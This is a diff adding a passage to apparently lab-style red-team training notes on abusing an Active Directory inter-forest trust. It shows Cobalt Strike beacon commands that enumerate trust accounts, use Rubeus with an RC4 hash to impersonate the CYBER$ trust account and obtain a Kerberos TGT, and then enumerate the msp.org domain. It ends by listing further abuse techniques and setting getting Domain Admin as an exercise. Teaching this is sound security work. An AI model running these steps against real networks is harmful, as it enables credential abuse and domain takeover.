@@ -138,4 +138,29 @@ In most cases, the current [Out] key is the one to get. There is also a "trust a
 
     beacon> execute-assembly ADSearch.exe --search "(objectCategory=user)"
     [*] TOTAL NUMBER OF SEARCH RESULTS: 11...
+    [+] cn : CYBER$
+	[+] cn : STUDIO$
+
+The MSP domain will have a trust account called CYBER$, even though we can't enumerate across the trust to confirm it. This is the account we must impersonate to request Kerberos tickets across the trust. RC4 tickets are used by default across trusts.
+
+    beacon> execute-assembly Rubeus.exe asktgt /user:CYBER$ /domain:msp.org /rc4:f3fc2... /nowrap
+
+This TGT can now be used to interact with the domain.
+
+    beacon> run klist
+    beacon> powershell Get-Domain -Domain msp.org
+    Forest                  : msp.org
+    DomainControllers       : {ad.msp.org}
+    Children                : {}
+    DomainMode              : Unknown
+    DomainModeLevel         : 7
+    Parent                  : 
+    PdcRoleOwner            : ad.msp.org
+    RidRoleOwner            : ad.msp.org
+    InfrastructureRoleOwner : ad.msp.org
+    Name                    : msp.org
+
+This account is not a domain admin, but can use many abuse primitives across the trust to elevate privileges (e.g. kerberoasting, ASREPRoasting, RBCD, and vulnerable certificate templates).
+
+Try to find a way to get DA in this forest.
 
